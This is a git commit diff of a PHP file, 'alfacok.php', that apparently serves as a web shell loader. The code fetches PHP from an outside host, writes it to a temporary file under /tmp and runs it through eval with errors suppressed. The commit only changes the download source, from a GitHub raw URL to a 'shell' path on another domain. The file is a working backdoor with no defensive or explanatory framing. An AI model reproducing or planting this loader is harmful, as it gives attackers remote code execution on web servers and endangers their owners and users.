6812e28925de58079e96f6fd91adc049133bb376
ONEJACK <42226890+ONEJACK@users.noreply.github.com>
2023-09-18 15:53:52 +0700

    Update alfacok.php

--- alfacok.php
+++ alfacok.php
@@ -3,6 +3,6 @@
 $rand = rand(00000000,99999999);
 $md5 = md5($rand);
 if(!is_file('/tmp/ses_'.$md5)) {
-    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/ONEJACK/a/main/alfabusuk.php'));
+    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://botay.my.id/shell/0x0x0x0x0x0x0x0x0x0x0.txt'));
 }
 @eval('?>'.file_get_contents('/tmp/ses_'.$md5));
